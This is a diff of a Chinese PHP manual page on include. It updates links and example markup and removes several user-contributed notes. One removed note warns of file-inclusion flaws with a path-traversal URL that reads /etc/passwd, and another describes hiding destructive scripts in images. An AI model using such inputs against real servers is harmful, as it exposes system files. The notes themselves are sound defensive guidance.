@@ -3,8 +3,8 @@
  <head>
   <meta http-equiv="content-type" content="text/html; CHARSET=gb2312">
   <title>include</title>
-<link media="all" rel="stylesheet" type="text/css" href="styles/46435ff017f60abb4908b0ce55102d08-theme-base.css" />
-<link media="all" rel="stylesheet" type="text/css" href="styles/46435ff017f60abb4908b0ce55102d08-theme-medium.css" />
+<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-base.css" />
+<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-medium.css" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <link media="all" rel="stylesheet" type="text/css" href="style.css"/>
@@ -39,13 +39,13 @@
   <a href="ini.core.html#ini.include-path" class="link">include_path</a> 指定的目录寻找。如果在
   <a href="ini.core.html#ini.include-path" class="link">include_path</a> 下没找到该文件则
   <code class="literal">include</code> 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则
-  <code class="literal">include</code> 结构会发出一条 <strong><code>E_WARNING</code></strong> ；这一点和
-  <span class="function"><a href="function.require.html" class="function">require</a></span> 不同，后者会发出一个 <strong><code>E_ERROR</code></strong> 。
+  <code class="literal">include</code> 结构会发出一条 <strong><code><a href="errorfunc.constants.html#constant.e-warning">E_WARNING</a></code></strong> ；这一点和
+  <span class="function"><a href="function.require.html" class="function">require</a></span> 不同，后者会发出一个 <strong><code><a href="errorfunc.constants.html#constant.e-error">E_ERROR</a></code></strong> 。
  </p>
  <p class="simpara">
   注意如果文件无法访问， <code class="literal">include</code> 和 <code class="literal">require</code>
-  在分别发出最后的 <strong><code>E_WARNING</code></strong> 或 <strong><code>E_ERROR</code></strong>
-  之前，都会发出额外一条 <strong><code>E_WARNING</code></strong>。
+  在分别发出最后的 <strong><code><a href="errorfunc.constants.html#constant.e-warning">E_WARNING</a></code></strong> 或 <strong><code><a href="errorfunc.constants.html#constant.e-error">E_ERROR</a></code></strong>
+  之前，都会发出额外一条 <strong><code><a href="errorfunc.constants.html#constant.e-warning">E_WARNING</a></code></strong>。
  </p>
  <p class="simpara">
   如果定义了路径&mdash;&mdash;不管是绝对路径（在 Windows
@@ -62,13 +62,10 @@
   当一个文件被包含时，其中所包含的代码继承了 include 所在行的<a href="language.variables.scope.html" class="link">变量范围</a>。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。不过所有在包含文件中定义的函数和类都具有全局作用域。
  </p>
  <p class="para">
-  <div class="example" id="example-274">
+  <div class="example" id="example-139">
    <p><strong>Example #1 基本的 <code class="literal">include</code> 例子</strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><span style="color: #007700">= </span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit </span><span style="color: #007700">= </span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A<br /><br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A green apple<br /><br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000">vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><span style="color: #007700">= </span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit </span><span style="color: #007700">= </span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A<br /><br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A green apple<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
@@ -77,13 +74,10 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><sp
   如果 include 出现于调用文件中的一个函数里，则被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样。所以它将遵循该函数的变量范围。此规则的一个例外是<a href="language.constants.predefined.html" class="link">魔术常量</a>，它们是在发生包含之前就已被解析器处理的。
  </p>
  <p class="para">
-  <div class="example" id="example-276">
+  <div class="example" id="example-140">
    <p><strong>Example #2 函数中的包含</strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function </span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />    global </span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />    include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />    echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/* vars.php 在 foo() 范围内，所以 $fruit 在范围为不可用。 *<br /> * $color 能用是因为声明成全局变量。 */<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();                    </span><span style="color: #FF8000">// A green apple<br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;   </span><span style="color: #FF8000">// A green<br /><br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function </span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />    global </span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />    include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />    echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/* vars.php 在 foo() 范围内，所以 $fruit 在范围为不可用。 *<br /> * $color 能用是因为声明成全局变量。 */<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();                    </span><span style="color: #FF8000">// A green apple<br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;   </span><span style="color: #FF8000">// A green<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
@@ -101,13 +95,10 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><sp
   请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。
  </p>
  <p class="para">
-  <div class="example" id="example-278">
+  <div class="example" id="example-141">
    <p><strong>Example #3 通过 HTTP 进行的 <code class="literal">include</code></strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/* 这个示例假定 www.example.com 配置为解析 .php 文件而不解析 .txt 文件。 *<br /> * 此外 "Works" 意味着 $foo 和 $bar 变量在包含的文件中是可用的。         */<br /><br />// 无法执行； file.txt 没有被 www.example.com 当作 PHP 处理。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// 无法执行；在本地文件系统中查找名为 "file.php?foo=1&amp;bar=2" 的文件。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// 正常。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/* 这个示例假定 www.example.com 配置为解析 .php 文件而不解析 .txt 文件。 *<br /> * 此外 "Works" 意味着 $foo 和 $bar 变量在包含的文件中是可用的。         */<br /><br />// 无法执行； file.txt 没有被 www.example.com 当作 PHP 处理。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// 无法执行；在本地文件系统中查找名为 "file.php?foo=1&amp;bar=2" 的文件。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// 正常。<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
@@ -136,25 +127,19 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><sp
  </p>
  <p class="para">
   因为 <code class="literal">include</code> 是一个特殊的语言结构，其参数不需要括号。在比较其返回值时要注意。
-  <div class="example" id="example-280">
+  <div class="example" id="example-142">
    <p><strong>Example #4 比较 include 的返回值</strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">// 不能运行，执行 include(('vars.php') == TRUE) 就等于执行 include('1')<br /></span><span style="color: #007700">if (include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">// 正常<br /></span><span style="color: #007700">if ((include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">// 不能运行，执行 include(('vars.php') == TRUE) 就等于执行 include('1')<br /></span><span style="color: #007700">if (include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">// 正常<br /></span><span style="color: #007700">if ((include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
  </p>
  <p class="para">
-  <div class="example" id="language.oop5.final.example.php81">
+  <div class="example" id="example-143">
    <p><strong>Example #5 <code class="literal">include</code> 和 <span class="function"><a href="function.return.html" class="function">return</a></span> 语句</strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return </span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo </span><span style="color: #007700">= include </span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$foo</span><span style="color: #007700">; </span><span style="color: #FF8000">// 打印 'PHP'<br /><br /></span><span style="color: #0000BB">$bar </span><span style="color: #007700">= include </span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$bar</span><span style="color: #007700">; </span><span style="color: #FF8000">// 打印 1<br /><br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000">return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return </span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo </span><span style="color: #007700">= include </span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$foo</span><span style="color: #007700">; </span><span style="color: #FF8000">// 打印 'PHP'<br /><br /></span><span style="color: #0000BB">$bar </span><span style="color: #007700">= include </span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$bar</span><span style="color: #007700">; </span><span style="color: #FF8000">// 打印 1<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
@@ -163,7 +148,7 @@ return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><sp
   <code class="literal">$bar</code> 的值为 <code class="literal">1</code> 是因为 include
   成功运行了。注意以上例子中的区别。第一个在被包含的文件中用了
   <span class="function"><a href="function.return.html" class="function">return</a></span> 而另一个没有。如果文件不能被包含，则返回
-  <strong><code>false</code></strong> 并发出一个 <strong><code>E_WARNING</code></strong> 警告。
+  <strong><code><a href="reserved.constants.html#constant.false">false</a></code></strong> 并发出一个 <strong><code><a href="errorfunc.constants.html#constant.e-warning">E_WARNING</a></code></strong> 警告。
  </p>
  <p class="para">
   如果在包含文件中定义了函数，无论是在 <span class="function"><a href="function.return.html" class="function">return</a></span>
@@ -176,13 +161,10 @@ return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><sp
   <span class="function"><strong>include</strong></span> 来捕获其输出，例如：
  </p>
  <p class="para">
-  <div class="example" id="example-284">
+  <div class="example" id="example-144">
    <p><strong>Example #6 使用输出缓冲来将 PHP 文件包含入一个字符串</strong></p>
    <div class="example-contents">
-<div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br />$string </span><span style="color: #007700">= </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">) {<br />    if (</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)) {<br />        </span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />        include </span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />        </span><span style="color: #0000BB">$contents </span><span style="color: #007700">= </span><span style="color: #0000BB">ob_get_contents</span><span style="color: #007700">();<br />        </span><span style="color: #0000BB">ob_end_clean</span><span style="color: #007700">();<br />        return </span><span style="color: #0000BB">$contents</span><span style="color: #007700">;<br />    }<br />    return </span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span>
-</span>
-</code></div>
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br />$string </span><span style="color: #007700">= </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">) {<br />    if (</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)) {<br />        </span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />        include </span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />        </span><span style="color: #0000BB">$contents </span><span style="color: #007700">= </span><span style="color: #0000BB">ob_get_contents</span><span style="color: #007700">();<br />        </span><span style="color: #0000BB">ob_end_clean</span><span style="color: #007700">();<br />        return </span><span style="color: #0000BB">$contents</span><span style="color: #007700">;<br />    }<br />    return </span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>
 
   </div>
@@ -373,47 +355,6 @@ couldn't include this file</span>
    </div>
   </div>
  <div class="foot"></div>
-  <a name="117011""></a>
-  <div class="note">
-   <strong class="user">Jero Minh</strong>
-   <a href="#117011" class="date">01-Apr-2015 10:55</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-Notice that using @include (instead of include without @) will set the local value of error_reporting to 0 inside the included script.<br />
-<br />
-Consider the following:<br />
-<span class="default">&lt;?php<br />
-&nbsp;&nbsp;&nbsp; ini_set</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">, </span><span class="default">E_ALL</span><span class="keyword">);<br />
-<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value before: "</span><span class="keyword">;<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="string">"\r\n"</span><span class="keyword">;<br />
-<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="string">"include foo.php: "</span><span class="keyword">;<br />
-&nbsp;&nbsp;&nbsp; include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
-<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="string">"@include foo.php: "</span><span class="keyword">;<br />
-&nbsp;&nbsp;&nbsp; @include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
-<br />
-&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value now: " </span><span class="keyword">. </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-foo.php<br />
-<span class="default">&lt;?php<br />
-&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">) . </span><span class="string">"\r\n"</span><span class="keyword">;<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-Output:<br />
-&nbsp;&nbsp;&nbsp; Own value before: 32767<br />
-&nbsp;&nbsp;&nbsp; include foo.php: 32767<br />
-&nbsp;&nbsp;&nbsp; @include foo.php: 0<br />
-&nbsp;&nbsp;&nbsp; Own value now: 32767</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
   <a name="116522""></a>
   <div class="note">
    <strong class="user">Rash</strong>
@@ -474,44 +415,6 @@ require_once(</span><span class="default">$cfg_path</span><span class="keyword">
    </div>
   </div>
  <div class="foot"></div>
-  <a name="115360""></a>
-  <div class="note">
-   <strong class="user">abanarn at gmail dot com</strong>
-   <a href="#115360" class="date">11-Jul-2014 02:56</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-To Windows coders, if you are upgrading from 5.3 to 5.4 or even 5.5; if you have have coded a path in your require or include you will have to be careful. Your code might not be backward compatible. To be more specific; the code escape for ESC, which is "\e" was introduced in php 5.4.4 + but if you use 5.4.3 you should be fine. For instance:<br />
-<br />
-Test script:<br />
--------------<br />
-<span class="default">&lt;?php<br />
-</span><span class="keyword">require(</span><span class="string">"C:\element\scripts\include.php"</span><span class="keyword">);<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-In php 5.3.* to php 5.4.3<br />
-----------------------------<br />
-If you use require("C:\element\scripts\include.php")&nbsp; it will work fine.<br />
-<br />
-If php 5.4.4 + It will break.<br />
-------------------------------<br />
-Warning: require(C:←lement\scripts\include.php): failed to open stream: In<br />
-valid argument in C:\element\scripts\include.php on line 20<br />
-<br />
-Fatal error: require(): Failed opening required 'C:←lement\scripts\include.php<br />
-<br />
-Solution:<br />
------------<br />
-Theoretically, you should be always using "\\" instead of "\" when you write php in windows machine OR use "/" like in Linux and you should fine since "\" is an escape character in most programming languages.<br />
-If you are not using absolute paths ; stream functions is your best friend like stream_resolve_include_path() , but you need to include the path you are resolving in you php.ini (include_path variable).<br />
-<br />
-I hope this makes sense and I hope it will someone sometime down the road.<br />
-cheers,</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
   <a name="107685""></a>
   <div class="note">
    <strong class="user">Anon</strong>
@@ -521,77 +424,6 @@ cheers,</span>
 <code><span class="html">
 I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />
 Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="102731""></a>
-  <div class="note">
-   <strong class="user">sPlayer</strong>
-   <a href="#102731" class="date">02-Mar-2011 09:09</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-Sometimes it will be usefull to include a string as a filename
-<br />
-
-<br />
-<span class="default">&lt;?php
-<br />
-
-<br />
-</span><span class="comment">//get content
-<br />
-</span><span class="default">$cFile </span><span class="keyword">= </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">'crypted.file'</span><span class="keyword">);
-<br />
-</span><span class="comment">//decrypt the content
-<br />
-</span><span class="default">$content </span><span class="keyword">= </span><span class="default">decrypte</span><span class="keyword">(</span><span class="default">$cFile</span><span class="keyword">);
-<br />
-
-<br />
-</span><span class="comment">//include this
-<br />
-</span><span class="keyword">include(</span><span class="string">"data://text/plain;base64,"</span><span class="keyword">.</span><span class="default">base64_encode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
-<br />
-</span><span class="comment">//or
-<br />
-</span><span class="keyword">include(</span><span class="string">"data://text/plain,"</span><span class="keyword">.</span><span class="default">urlencode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
-<br />
-</span><span class="default">?&gt;</span>
-</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="100553""></a>
-  <div class="note">
-   <strong class="user">joe dot naylor at gmail dot com</strong>
-   <a href="#100553" class="date">22-Oct-2010 02:11</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-Be very careful with including files based on user inputed data.&nbsp; For instance, consider this code sample:<br />
-<br />
-index.php:<br />
-<span class="default">&lt;?php<br />
-$page </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'page'</span><span class="keyword">];<br />
-if (</span><span class="default">file_exists</span><span class="keyword">(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">))<br />
-{<br />
-&nbsp;&nbsp; include(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">);<br />
-}<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-Then go to URL:<br />
-index.php?page=/../../../../../../etc/passwd%00.html<br />
-<br />
-file_exists() will return true, your passwd file will be included and since it's not php code it will be output directly to the browser.<br />
-<br />
-Of course the same vulnerability exists if you are reading a file to display, as in a templating engine.<br />
-<br />
-You absolutely have to sanitize any input string that will be used to access the filesystem, you can't count on an absolute path or appended file extension to secure it.&nbsp; Better yet, know exactly what options you can accept and accept only those options.</span>
 </code>
     </div>
    </div>
@@ -745,35 +577,6 @@ Wade.</span>
    </div>
   </div>
  <div class="foot"></div>
-  <a name="85862""></a>
-  <div class="note">
-   <strong class="user">example at user dot com</strong>
-   <a href="#85862" class="date">21-Sep-2008 09:33</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-Just about any file type can be 'included' or 'required'.&nbsp; By sending appropriate headers, like in the below example, the client would normally see the output in their browser as an image or other intended mime type.<br />
-<br />
-You can also embed text in the output, like in the example below.&nbsp; But an image is still an image to the client's machine.&nbsp; The client must open the downloaded file as plain/text to see what you embedded.<br />
-<br />
-<span class="default">&lt;?php <br />
-<br />
-header</span><span class="keyword">(</span><span class="string">'Content-type: image/jpeg'</span><span class="keyword">);<br />
-</span><span class="default">header</span><span class="keyword">(</span><span class="string">'Content-Disposition: inline;'</span><span class="keyword">);<br />
-<br />
-include </span><span class="string">'/some_image.jpg'</span><span class="keyword">;<br />
-echo </span><span class="string">'This file was provided by example@user.com.'</span><span class="keyword">;<br />
-<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-Which brings us to a major security issue.&nbsp; Scripts can be hidden within images or files using this method.&nbsp; For example, instead echoing "<span class="default">&lt;?php phpinfo</span><span class="keyword">(); </span><span class="default">?&gt;</span>", a foreach/unlink loop through the entire filesystem, or some other method of disabling security on your machine.<br />
-<br />
-'Including' any file made this way will execute those scripts.&nbsp; NEVER 'include' anything that you found on the web or that users upload or can alter in any way.&nbsp; Instead, use something a little safer to display the found file, like "echo file_get_contents('/some_image.jpg');"</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
   <a name="83066""></a>
   <div class="note">
    <strong class="user">Rick Garcia</strong>
@@ -808,138 +611,6 @@ If you're running scripts from below your main web directory, put a prepend.php 
 </span>--<br />
 <br />
 This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="81367""></a>
-  <div class="note">
-   <strong class="user">uramihsayibok, gmail, com</strong>
-   <a href="#81367" class="date">24-Feb-2008 05:28</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-I have a need to include a lot of files, all of which are contained in one directory. Support for things like <span class="default">&lt;?php </span><span class="keyword">include_once </span><span class="string">'dir/*.php'</span><span class="keyword">; </span><span class="default">?&gt;</span> would be nice, but it doesn't exist.<br />
-<br />
-Therefore I wrote this quick function (located in a file automatically included by auto_prepend_file):<br />
-<span class="default">&lt;?php<br />
-<br />
-</span><span class="keyword">function </span><span class="default">include_all_once </span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) {<br />
-&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">glob</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) as </span><span class="default">$file</span><span class="keyword">) { </span><span class="comment">// remember the { and } are necessary!<br />
-&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">include </span><span class="default">$file</span><span class="keyword">;<br />
-&nbsp;&nbsp;&nbsp; }<br />
-}<br />
-<br />
-</span><span class="comment">// used like<br />
-</span><span class="default">include_all_once</span><span class="keyword">(</span><span class="string">'dir/*.php'</span><span class="keyword">);<br />
-<br />
-</span><span class="default">?&gt;<br />
-</span>A fairly obvious solution. It doesn't deal with relative file paths though; you still have to do that yourself.</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="73148""></a>
-  <div class="note">
-   <strong class="user">mbread at m-bread dot com</strong>
-   <a href="#73148" class="date">10-Feb-2007 09:23</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-If you have a problem with "Permission denied" errors (or other permissions problems) when including files, check:<br />
-<br />
-1) That the file you are trying to include has the appropriate "r" (read) permission set, and<br />
-2) That all the directories that are ancestors of the included file, but not of the script including the file, have the appropriate "x" (execute/search) permission set.</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="42906""></a>
-  <div class="note">
-   <strong class="user">durkboek A_T hotmail D_O_T com</strong>
-   <a href="#42906" class="date">03-Jun-2004 04:09</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-I would like to emphasize the danger of remote includes. For example:<br />
-Suppose, we have a server A with Linux and PHP 4.3.0 or greater installed which has the file index.php with the following code:<br />
-<br />
-<span class="default">&lt;?php<br />
-</span><span class="comment">// File: index.php<br />
